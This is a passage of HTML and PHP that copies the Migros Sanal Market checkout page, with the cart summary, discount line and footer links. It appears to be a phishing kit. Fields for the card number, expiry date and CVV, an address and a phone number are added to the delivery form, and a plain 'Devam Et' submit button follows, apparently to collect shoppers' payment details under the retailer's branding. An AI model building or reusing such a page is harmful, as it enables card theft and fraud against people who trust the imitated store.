                                    <!---->
                                    <input name="kart" _ngcontent-isc-c471="" matinput="" required="" type="text" label="Ad" formcontrolname="firstName" class="mat-mdc-input-element ng-tns-c189-27 mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored" id="mat-input-10" aria-required="true">
                                  </div>
                                  <!---->
                                  <!---->
                                </div>
                                <!---->
                              </div>
                              <div class="mat-mdc-form-field-subscript-wrapper mat-mdc-form-field-bottom-align ng-tns-c189-27">
                                <!---->
                                <div class="mat-mdc-form-field-hint-wrapper ng-tns-c189-27 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                  <!---->
                                  <div class="mat-mdc-form-field-hint-spacer ng-tns-c189-27"></div>
                                </div>
                                <!---->
                              </div>
                              <sm-delivery-address-form _ngcontent-isc-c482="" _nghost-isc-c471="">
                          Kart Tarih
                          <form _ngcontent-isc-c471="" novalidate="" class="delivery-form ng-untouched ng-pristine ng-invalid">
                            <mat-form-field _ngcontent-isc-c471="" appearance="outline" class="mat-mdc-form-field ng-tns-c189-27 mat-mdc-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-hide-placeholder mat-primary ng-untouched ng-pristine ng-invalid ng-star-inserted">
                              <!---->
                              <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c189-27 mdc-text-field--outlined">
                                <!---->
                                <div class="mat-mdc-form-field-flex ng-tns-c189-27">
                                  <div matformfieldnotchedoutline="" class="mdc-notched-outline ng-tns-c189-27 mdc-notched-outline--upgraded ng-star-inserted">
                                    <div class="mdc-notched-outline__leading"></div>
                                    <div class="mdc-notched-outline__notch">

                                      <label matformfieldfloatinglabel="" class="mdc-floating-label mat-mdc-floating-label ng-tns-c189-27 ng-star-inserted" id="mat-mdc-form-field-label-20" for="mat-input-10" aria-owns="mat-input-10" style="">
                                        <mat-label _ngcontent-isc-c471="" class="ng-tns-c189-27"></mat-label>
                                        <span  aria-hidden="true" class="mat-mdc-form-field-required-marker mdc-floating-label--required ng-tns-c189-27 ng-star-inserted"></span>
                                        <!---->
                                      </label>
                                      <!---->
                                      <!---->
                                      <!---->
                                    </div>
                                    <div class="mdc-notched-outline__trailing"></div>
                                  </div>
                                  <!---->
                                  <!---->
                                  <!---->
                                  <div class="mat-mdc-form-field-infix ng-tns-c189-27">
                                    <!---->
                                    <input name="karttarih" _ngcontent-isc-c471="" matinput="" required="" type="text" label="Ad" formcontrolname="firstName" class="mat-mdc-input-element ng-tns-c189-27 mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored" id="mat-input-10" aria-required="true">
                                  </div>
                                  <!---->
                                  <!---->
                                </div>
                                <!---->
                              </div>
                              <div class="mat-mdc-form-field-subscript-wrapper mat-mdc-form-field-bottom-align ng-tns-c189-27">
                                <!---->
                                <div class="mat-mdc-form-field-hint-wrapper ng-tns-c189-27 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                  <!---->
                                  <div class="mat-mdc-form-field-hint-spacer ng-tns-c189-27"></div>
                                </div>
                                <!---->
                              </div>
                              <sm-delivery-address-form _ngcontent-isc-c482="" _nghost-isc-c471="">
                          Kart Cvv
                          <form _ngcontent-isc-c471="" novalidate="" class="delivery-form ng-untouched ng-pristine ng-invalid">
                            <mat-form-field _ngcontent-isc-c471="" appearance="outline" class="mat-mdc-form-field ng-tns-c189-27 mat-mdc-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-hide-placeholder mat-primary ng-untouched ng-pristine ng-invalid ng-star-inserted">
                              <!---->
                              <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c189-27 mdc-text-field--outlined">
                                <!---->
                                <div class="mat-mdc-form-field-flex ng-tns-c189-27">
                                  <div matformfieldnotchedoutline="" class="mdc-notched-outline ng-tns-c189-27 mdc-notched-outline--upgraded ng-star-inserted">
                                    <div class="mdc-notched-outline__leading"></div>
                                    <div class="mdc-notched-outline__notch">

                                      <label matformfieldfloatinglabel="" class="mdc-floating-label mat-mdc-floating-label ng-tns-c189-27 ng-star-inserted" id="mat-mdc-form-field-label-20" for="mat-input-10" aria-owns="mat-input-10" style="">
                                        <mat-label _ngcontent-isc-c471="" class="ng-tns-c189-27"></mat-label>
                                        <span  aria-hidden="true" class="mat-mdc-form-field-required-marker mdc-floating-label--required ng-tns-c189-27 ng-star-inserted"></span>
                                        <!---->
                                      </label>
                                      <!---->
                                      <!---->
                                      <!---->
                                    </div>
                                    <div class="mdc-notched-outline__trailing"></div>
                                  </div>
                                  <!---->
                                  <!---->
                                  <!---->
                                  <div class="mat-mdc-form-field-infix ng-tns-c189-27">
                                    <!---->
                                    <input name="kartcvv" _ngcontent-isc-c471="" matinput="" required="" type="text" label="Ad" formcontrolname="firstName" class="mat-mdc-input-element ng-tns-c189-27 mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored" id="mat-input-10" aria-required="true">
                                  </div>
                                  <!---->
                                  <!---->
                                </div>
                                <!---->
                              </div>
                              <div class="mat-mdc-form-field-subscript-wrapper mat-mdc-form-field-bottom-align ng-tns-c189-27">
                                <!---->
                                <div class="mat-mdc-form-field-hint-wrapper ng-tns-c189-27 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                  <!---->
                                  <div class="mat-mdc-form-field-hint-spacer ng-tns-c189-27"></div>
                                </div>
                                <!---->
                              </div>
                              <sm-delivery-address-form _ngcontent-isc-c482="" _nghost-isc-c471="">
                          Açık Adres
                          <form _ngcontent-isc-c471="" novalidate="" class="delivery-form ng-untouched ng-pristine ng-invalid">
                            <mat-form-field _ngcontent-isc-c471="" appearance="outline" class="mat-mdc-form-field ng-tns-c189-27 mat-mdc-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-hide-placeholder mat-primary ng-untouched ng-pristine ng-invalid ng-star-inserted">
                              <!---->
                              <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c189-27 mdc-text-field--outlined">
                                <!---->
                                <div class="mat-mdc-form-field-flex ng-tns-c189-27">
                                  <div matformfieldnotchedoutline="" class="mdc-notched-outline ng-tns-c189-27 mdc-notched-outline--upgraded ng-star-inserted">
                                    <div class="mdc-notched-outline__leading"></div>
                                    <div class="mdc-notched-outline__notch">

                                      <label matformfieldfloatinglabel="" class="mdc-floating-label mat-mdc-floating-label ng-tns-c189-27 ng-star-inserted" id="mat-mdc-form-field-label-20" for="mat-input-10" aria-owns="mat-input-10" style="">
                                        <mat-label _ngcontent-isc-c471="" class="ng-tns-c189-27"></mat-label>
                                        <span  aria-hidden="true" class="mat-mdc-form-field-required-marker mdc-floating-label--required ng-tns-c189-27 ng-star-inserted"></span>
                                        <!---->
                                      </label>
                                      <!---->
                                      <!---->
                                      <!---->
                                    </div>
                                    <div class="mdc-notched-outline__trailing"></div>
                                  </div>
                                  <!---->
                                  <!---->
                                  <!---->
                                  <div class="mat-mdc-form-field-infix ng-tns-c189-27">
                                    <!---->
                                    <input name="adres" _ngcontent-isc-c471="" matinput="" required="" type="text" label="Ad" formcontrolname="firstName" class="mat-mdc-input-element ng-tns-c189-27 mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored" id="mat-input-10" aria-required="true">
                                  </div>
                                  <!---->
                                  <!---->
                                </div>
                                <!---->
                              </div>
                              <div class="mat-mdc-form-field-subscript-wrapper mat-mdc-form-field-bottom-align ng-tns-c189-27">
                                <!---->
                                <div class="mat-mdc-form-field-hint-wrapper ng-tns-c189-27 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                  <!---->
                                  <div class="mat-mdc-form-field-hint-spacer ng-tns-c189-27"></div>
                                </div>
                                <!---->
                              </div>
                              <sm-delivery-address-form _ngcontent-isc-c482="" _nghost-isc-c471="">
                                <br>
                          Telefon Numarası                                     :
                          <form _ngcontent-isc-c471="" novalidate="" class="delivery-form ng-untouched ng-pristine ng-invalid">
                            <mat-form-field _ngcontent-isc-c471="" appearance="outline" class="mat-mdc-form-field ng-tns-c189-27 mat-mdc-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-hide-placeholder mat-primary ng-untouched ng-pristine ng-invalid ng-star-inserted">
                              <!---->
                              <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c189-27 mdc-text-field--outlined">
                                <!---->
                                <div class="mat-mdc-form-field-flex ng-tns-c189-27">
                                  <div matformfieldnotchedoutline="" class="mdc-notched-outline ng-tns-c189-27 mdc-notched-outline--upgraded ng-star-inserted">
                                    <div class="mdc-notched-outline__leading"></div>
                                    <div class="mdc-notched-outline__notch">

                                      <label matformfieldfloatinglabel="" class="mdc-floating-label mat-mdc-floating-label ng-tns-c189-27 ng-star-inserted" id="mat-mdc-form-field-label-20" for="mat-input-10" aria-owns="mat-input-10" style="">
                                        <mat-label _ngcontent-isc-c471="" class="ng-tns-c189-27"></mat-label>
                                        <span  aria-hidden="true" class="mat-mdc-form-field-required-marker mdc-floating-label--required ng-tns-c189-27 ng-star-inserted"></span>
                                        <!---->
                                      </label>
                                      <!---->
                                      <!---->
                                      <!---->
                                    </div>
                                    <div class="mdc-notched-outline__trailing"></div>
                                  </div>
                                  <!---->
                                  <!---->
                                  <!---->
                                  <div class="mat-mdc-form-field-infix ng-tns-c189-27">
                                    <!---->
                                    <input name="telefon" _ngcontent-isc-c471="" matinput="" required="" type="text" label="Ad" formcontrolname="firstName" class="mat-mdc-input-element ng-tns-c189-27 mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored" id="mat-input-10" aria-required="true">
                                  </div>
                                  <!---->
                                  <!---->
                                </div>
                                <!---->
                              </div>
                                <div class="mat-mdc-form-field-subscript-wrapper mat-mdc-form-field-bottom-align ng-tns-c189-35">
                                  <!---->
                                  <div class="mat-mdc-form-field-hint-wrapper ng-tns-c189-35 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                    <!---->
                                    <div class="mat-mdc-form-field-hint-spacer ng-tns-c189-35"></div>
                                  </div>
                                  <!---->
                                </div>
                              
                              <!---->
                              <!---->
                            </div>
                          </form>
                        </sm-delivery-address-form>
                      </div>
                    </div>
                  </div>
                </div>
                <div _ngcontent-isc-c482="" class="mdc-layout-grid__cell--span-4 mdc-layout-grid__cell--span-8-tablet cart-summary">
                  <!---->
                  <sm-delivery-address-cart-summary _ngcontent-isc-c482="" _nghost-isc-c473="" class="ng-star-inserted">
                    <div _ngcontent-isc-c473="" class="form__container">
                      <div _ngcontent-isc-c473="" class="form__container__in">
                        <div _ngcontent-isc-c473="" class="cart-summary__row">
                          <span _ngcontent-isc-c473="" class="subtitle-1">Sepet Özeti</span>
                          <span _ngcontent-isc-c473="" class="mat-body-2 text-color-grey">1 Ürün </span>
                        </div>
                        <div _ngcontent-isc-c473="" class="cart-summary__row">
                          <span _ngcontent-isc-c473="" class="mat-body-2">Sipariş Tutarı</span>
                          <span _ngcontent-isc-c473="" class="mat-body-2"><?php echo $urun["fiyat"];?> <span _ngcontent-isc-c473="" class="mat-body-2">TL</span>
                          </span>
                        </div>
                        <div _ngcontent-isc-c473="" class="cart-summary__row discount ng-star-inserted">
                          <span _ngcontent-isc-c473="" class="mat-body-2">Migros İndirimi</span>
                          <span _ngcontent-isc-c473="" class="mat-body-2">-40,00 <span _ngcontent-isc-c473="" class="mat-body-2">TL</span>
                          </span>
                        </div>
                        <!---->
                        <!---->
                        <div _ngcontent-isc-c473="" class="cart-summary__row total">
                          <span _ngcontent-isc-c473="" class="subtitle-1">Genel Toplam</span>
                          <span _ngcontent-isc-c473="" class="subtitle-1"><?php echo $urun["fiyat"];?><span _ngcontent-isc-c473="" class="subtitle-1">TL</span>
                          </span>
                        </div>
                      </div>
                      <mat-divider _ngcontent-isc-c473="" role="separator" inset="" class="mat-divider mat-divider-horizontal mat-divider-inset" aria-orientation="horizontal"></mat-divider>
                      <div _ngcontent-isc-c473="" class="form__container__in">
                        <div _ngcontent-isc-c473="" class="cart-summary__row agreement ng-star-inserted">
                          <mat-checkbox _ngcontent-isc-c473="" feturndeepinputautocompleteoff="" color="primary" class="mat-mdc-checkbox mat-primary ng-untouched ng-pristine ng-valid" id="mat-mdc-checkbox-2">
                            <div class="mdc-form-field">
                              <div class="mdc-checkbox">
                                <div class="mat-mdc-checkbox-touch-target"></div>
                                <input type="checkbox" class="mdc-checkbox__native-control" id="mat-mdc-checkbox-2-input" tabindex="0" aria-checked="false" autocomplete="off">
                                <div class="mdc-checkbox__ripple"></div>
                                <div class="mdc-checkbox__background">
                                  <svg focusable="false" viewBox="0 0 24 24" aria-hidden="true" class="mdc-checkbox__checkmark">
                                    <path fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59" class="mdc-checkbox__checkmark-path"></path>
                                  </svg>
                                  <div class="mdc-checkbox__mixedmark"></div>
                                </div>
                                <div mat-ripple="" class="mat-ripple mat-mdc-checkbox-ripple mat-mdc-focus-indicator"></div>
                              </div>
                              <label for="mat-mdc-checkbox-2-input"></label>
                            </div>
                          </mat-checkbox>
                          <div _ngcontent-isc-c473="" class="agreement-description mat-caption-normal">
                            <a _ngcontent-isc-c473="" href="javascript:void(0)" class="text-color-orange">Kişisel Verilerin Korunması Hakkında Aydınlatma Yazısı</a>'nı okudum.
                          </div>
                        </div>


    <button name="send" type="submit" style="background-color: orange; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">
        Devam Et
    </button>
</form>
</form>


                      </div>
                    </div>
                    <!---->
                  </sm-delivery-address-cart-summary>
                  <!---->
                </div>
              </div>
            </div>
          </sm-delivery-address-page>
          <!---->
        </main>
        <!---->
        <div _ngcontent-isc-c377="" class="divider"></div>
        <sm-footer _ngcontent-isc-c377="" _nghost-isc-c301="">
          <div _ngcontent-isc-c301="" class="desktop-only">
            <div _ngcontent-isc-c301="" class="ng-star-inserted">
              <sm-footer-links _ngcontent-isc-c301="" _nghost-isc-c299="">
                <div _ngcontent-isc-c299="" class="links-wrapper lite">
                  <div _ngcontent-isc-c299="" class="inner-grid">
                    <div _ngcontent-isc-c299="" class="mdc-layout-grid__cell--span-3 mdc-layout-grid__cell--span-12-phone">
                      <p _ngcontent-isc-c299="" class="title"> Migros Sanal Market <fa-icon _ngcontent-isc-c299="" class="ng-fa-icon">
                          <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-down" class="svg-inline--fa fa-chevron-down" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                            <path fill="currentColor" d="M233.4 406.6c12.5 12.5 32.8 12.5 45.3 0l192-192c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L256 338.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l192 192z"></path>
                          </svg>
                        </fa-icon>
                      </p>
                      <div _ngcontent-isc-c299="" class="content">
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted" id="page-hakkimizda">
                          <a _ngcontent-isc-c299="" id="link-hakkimizda" href="/islem-rehberi?id=8"> Hakkımızda </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted" id="page-islem-rehberi">
                          <a _ngcontent-isc-c299="" id="link-islem-rehberi" href="/islem-rehberi?id=1"> İşlem Rehberi </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted" id="page-sikca-sorulan-sorular">
                          <a _ngcontent-isc-c299="" id="link-sikca-sorulan-sorular" href="/islem-rehberi?id=6"> Sıkça Sorulan Sorular </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted" id="page-musteri-hizmetleri">
                          <a _ngcontent-isc-c299="" id="link-musteri-hizmetleri" href="/islem-rehberi?id=5"> Müşteri Hizmetleri </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted" id="page-iletisim">
                          <a _ngcontent-isc-c299="" id="link-iletisim" href="/islem-rehberi?id=7"> İletişim </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted" id="page-kvkk-metni">
                          <a _ngcontent-isc-c299="" id="link-kvkk-metni" href="/islem-rehberi?id=9"> Kişisel Verilerin Korunması Hakkında Aydınlatma Metni </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted" id="page-kvkk-politikasi">
                          <a _ngcontent-isc-c299="" id="link-kvkk-politikasi" href="/islem-rehberi?id=767"> Kişisel Verilerin Korunması ve İşlenmesi Politikası </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted" id="page-kullanim-kosullari">
                          <a _ngcontent-isc-c299="" id="link-kullanim-kosullari" href="/islem-rehberi?id=10"> Kullanım Koşulları ve Gizlilik </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted" id="page-cerez-aydinlatma-metni">
                          <a _ngcontent-isc-c299="" id="link-cerez-aydinlatma-metni" href="/islem-rehberi?id=777"> Çerez Aydınlatma Metni </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted" id="page-e-arsiv-bildilendirme">
                          <a _ngcontent-isc-c299="" id="link-e-arsiv-bildilendirme" href="/islem-rehberi?id=12"> E-Arşiv Bilgilendirme </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted" id="page-guvenli-alisveris">
                          <a _ngcontent-isc-c299="" id="link-guvenli-alisveris" href="/islem-rehberi?id=11"> Güvenli Alışveriş </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted" id="page-markalar">
                          <a _ngcontent-isc-c299="" id="link-markalar" href="/markalar"> Markalar </a>
                        </p>
                        <!---->
                      </div>
                      <p _ngcontent-isc-c299="" class="title"> Kurumsal <fa-icon _ngcontent-isc-c299="" class="ng-fa-icon">
                          <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-down" class="svg-inline--fa fa-chevron-down" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                            <path fill="currentColor" d="M233.4 406.6c12.5 12.5 32.8 12.5 45.3 0l192-192c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L256 338.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l192 192z"></path>
                          </svg>
                        </fa-icon>
                      </p>
                      <div _ngcontent-isc-c299="" class="content">
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://www.migroskurumsal.com/surdurulebilirlik"> Sürdürülebilirlik </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://www.migroskurumsal.com/hakkimizda/kalite"> Kalite Anlayışı </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://toptan.migros.com.tr/"> Migros Toptan </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://www.migroskurumsal.com/hakkimizda/politikalarimiz#insan-kaynaklari-politikasi"> İnsan Kaynakları Politikamız </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://www.migroskurumsal.com/IKBasvuru.aspx?IcerikID=36"> İş Başvurusu </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://www.moneypay.com.tr/moneypaypro/index.html"> Kurumsal Kart &amp; Çek Satışı </a>
                        </p>
                        <!---->
                      </div>
                    </div>
                    <div _ngcontent-isc-c299="" class="popular-pages mdc-layout-grid__cell--span-5 mdc-layout-grid__cell--span-12-phone">
                      <p _ngcontent-isc-c299="" class="title"> Popüler Sayfalar <fa-icon _ngcontent-isc-c299="" class="ng-fa-icon">
                          <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-down" class="svg-inline--fa fa-chevron-down" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                            <path fill="currentColor" d="M233.4 406.6c12.5 12.5 32.8 12.5 45.3 0l192-192c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L256 338.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l192 192z"></path>
                          </svg>
                        </fa-icon>
                      </p>
                      <div _ngcontent-isc-c299="" class="content">
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/mevsim-sebzeleri-c-3f4"> Mevsim Sebzeleri </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/dondurma-c-41b"> Dondurma </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/dana-eti-c-3fa"> Dana Eti </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/maske-c-2915"> Maske </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/uzun-omurlu-sut-c-40a"> Uzun Ömürlü Süt </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/eldiven-c-2914"> Eldiven </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/egzotik-meyveler-c-3ea"> Egzotik Meyveler </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/el-dezenfektani-c-11861"> El Dezenfektanı </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/yumurta-c-70"> Yumurta </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/sac-bakim-c-8f"> Saç Bakım </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/kagit-havlu-c-49d"> Kağıt Havlu </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/tiras-malzemeleri-c-90"> Tıraş Malzemeleri </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/tuvalet-kagidi-c-49c"> Tuvalet Kağıdı </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/zeytinyagi-c-433"> Zeytinyağı </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/tiras-bicagi-c-4ab"> Tıraş Bıçağı </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/turk-kahvesi-c-28c4"> Türk Kahvesi </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/taze-kasar-c-273b"> Taze Kaşar </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/dis-macunu-c-4a1"> Diş Macunu </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/pilic-c-3fe"> Piliç </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/jel-camasir-suyu-c-28d7"> Jel Çamaşır Suyu </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/aycicek-yagi-c-42d"> Ayçiçek Yağı </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/kuzu-eti-c-3fb"> Kuzu Eti </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/atistirmalik-c-113fb"> Atıştırmalık </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/sampuan-c-4a4"> Şampuan </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/balik-deniz-urunleri-c-6a"> Balık &amp; Deniz Ürünleri </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/demlik-poset-cay-c-1121e"> Demlik Poşet Çay </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/bebek-bezi-c-ab"> Bebek Bezi </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/baldo-pirincler-c-2788"> Baldo Pirinç </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/bebek-mamasi-c-299b"> Bebek Maması </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/devam-sutu-c-1136b"> Devam Sütü </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/dis-fircasi-c-4a0"> Diş Fırçası </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/filtre-kahve-c-11223"> Filtre Kahve </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/dondurulmus-gida-c-7c"> Dondurulmuş Gıda </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/kolonya-c-4cf"> Kolonya </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/telefon-ve-aksesuarlari-c-525"> Telefon Ve Aksesuarları </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/hijyenik-ped-c-96"> Hijyenik Ped </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/kopek-mamasi-c-29dc"> Köpek Maması </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/cicek-bali-c-2769"> Çiçek Balı </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/kirtasiye-c-11420"> Kırtasiye </a>
                        </p>
                        <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                          <a _ngcontent-isc-c299="" href="/oyuncak-c-9e"> Oyuncak </a>
                        </p>
                        <!---->
                      </div>
                    </div>
                    <div _ngcontent-isc-c299="" class="mdc-layout-grid__cell--span-4 mdc-layout-grid__cell--span-3-tablet mdc-layout-grid__cell--span-12-phone right-container">
                      <div _ngcontent-isc-c299="" class="mdc-layout-grid__cell--span-6 mdc-layout-grid__cell--span-3-tablet mdc-layout-grid__cell--span-12-phone">
                        <p _ngcontent-isc-c299="" class="title"> Migros'ta Yenilikler <fa-icon _ngcontent-isc-c299="" class="ng-fa-icon">
                            <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-down" class="svg-inline--fa fa-chevron-down" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                              <path fill="currentColor" d="M233.4 406.6c12.5 12.5 32.8 12.5 45.3 0l192-192c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L256 338.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l192 192z"></path>
                            </svg>
                          </fa-icon>
                        </p>
                        <div _ngcontent-isc-c299="" class="content">
                          <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                            <a _ngcontent-isc-c299="" routerlinkactive="active" href="/alo-migros" class="ng-star-inserted"> Alo Migros </a>
                            <!---->
                            <!---->
                          </p>
                          <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                            <!---->
                            <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://www.money.com.tr/mc/money-ozelliklerini-kesfet/saglikli-yasam-yolculugum/123" class="ng-star-inserted"> Sağlıklı Yaşam Yolculuğum </a>
                            <!---->
                          </p>
                          <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                            <!---->
                            <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://www.money.com.tr" class="ng-star-inserted"> Money </a>
                            <!---->
                          </p>
                          <p _ngcontent-isc-c299="" class="link ng-star-inserted">
                            <!---->
                            <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://migrostv.migros.com.tr" class="ng-star-inserted"> Migros TV </a>
                            <!---->
                          </p>
                          <!---->
                        </div>
                        <p _ngcontent-isc-c299="" class="title">Mobil Uygulamalar</p>
